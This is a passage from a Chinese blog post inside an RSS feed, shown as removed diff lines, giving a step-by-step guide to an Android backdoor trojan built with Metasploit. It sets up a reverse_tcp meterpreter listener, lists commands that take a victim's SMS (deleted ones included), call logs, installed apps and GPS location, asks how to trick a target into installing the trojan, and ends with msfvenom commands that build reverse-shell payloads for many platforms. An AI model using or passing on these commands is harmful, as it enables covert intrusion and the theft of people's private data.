-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/posts/kaliMSF/4.jpeg&quot; alt=&quot;&quot; width=&quot;30%&quot; height=&quot;30%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;7. msfconsole     -》 启动 kali 内置的 msfconsole 工具。
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/posts/kaliMSF/5.png&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;8.配置参数：   
-
-use exploit/multi/handler     -》 （选择模块）
-
-set payload android/meterpreter/reverse_tcp     -》（选择攻击模块）
-
-set LhOST 192.168.0.114     -》（填写自己主机的IP地址）
-
-set lport 3369      -》（填写刚才生成文件时的端口号）
-
-run   -》 开始监听 
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/posts/kaliMSF/6.png&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;9. 在靶机上点击刚刚安装的木马程序，并观察监听程序窗口，出现meterpreter你就已经成功的入侵。
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/posts/kaliMSF/7.png&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-一些入侵命令  
-
-1.查看对方手机系统信息
-
-命令：sysinfo
-
-2.查看对方手机安装哪些app文件
-
-命令：app_list
-
-3.实时查看对方手机的短信，所有短信，甚至包含手机上已经删除的
-
-命令：dump_sms
-
-4.获取对方手机的通话记录
-
-命令：dump_calllog
-
-5.实时获取对方手机GPS定位
-
-命令：geolocate
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;如下图所示，这里成功的拿到了手机系统信息，以及所有短信，在 sms_dump_20221123021710.txt 这里。
-当出现 [-] Error running command dump_calllog: Rex::TimeoutError Operation timed out，这个信息时，
-则与靶机断开了连接，需要先退出监听 exit ，然后 重新运行 run ，再次在靶机上点击木马程序。
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/posts/kaliMSF/8.png&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/posts/kaliMSF/9.png&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;问题&quot;&gt;问题&lt;/h2&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;如何将木马文件安装在目标手机上，并诱导用户点击。&lt;/li&gt;
-  &lt;li&gt;连接有很大概率被拒绝 [*] 192.168.0.102 - Meterpreter session 3 closed.  Reason: Died，需要重试多次。&lt;/li&gt;
-  &lt;li&gt;连接过程中有很大概率被断开 [-] Error running command dump_calllog: Rex::TimeoutError Operation timed out，  需要重新运行监听程序。&lt;/li&gt;
-  &lt;li&gt;获取信息多为敏感信息，比如短信，通讯录，通话记录，定位信息等，这里是需要木马程序在靶机上申请敏感权限获取的，此时用户便会知情，点击拒绝则无法获取信息。&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;其它&quot;&gt;其它&lt;/h2&gt;
-
-&lt;p&gt;你不只可以生成android手机的后台程序，还可以&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;windows
-msfvenom -p windows/meterpreter/reverse_tcp LPORT=控制机端口 LHOST=控制机ip -f -o shell.exe
-安卓app:
-msfvenom -p android/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口 -o test2.apk
-Linux:
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口 -f elf &amp;gt; shell.elf
-Mac:
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=控制机ip LPORT=控制机端口 -f macho &amp;gt; shell.macho
-PHP：
-msfvenom -p php/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口-f raw -o test.php
-ASP:
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口-f asp &amp;gt; shell.asp
-ASPX：
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口-f aspx &amp;gt; shell.aspx
-JSP:
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=控制机ip LPORT=控制机端口 -f raw &amp;gt; shell.jsp
-Bash：
-msfvenom -p cmd/unix/reverse_bash LHOST=控制机ip LPORT=控制机端口-f   raw &amp;gt; shell.sh
-Perl
-msfvenom -p cmd/unix/reverse_perl LHOST=控制机ip LPORT=控制机端口-f raw &amp;gt; shell.pl
-Python
-msfvenom -p python/meterpreter/reverser_tcp LHOST=控制机ip LPORT=控制机端口-f   raw &amp;gt; shell.py
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2022/11/H系列 - Android 后门程序/&quot;&gt; H系列 - Android 后门程序 &lt;/a&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-</description>
-      <pubDate>Wed, 23 Nov 2022 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2022/11/H%E7%B3%BB%E5%88%97-Android-%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F/</link>
-      <guid isPermaLink="true">http://localhost:4000/2022/11/H%E7%B3%BB%E5%88%97-Android-%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F/</guid>
-        
-      <category>H系列</category>
         
         
     </item>
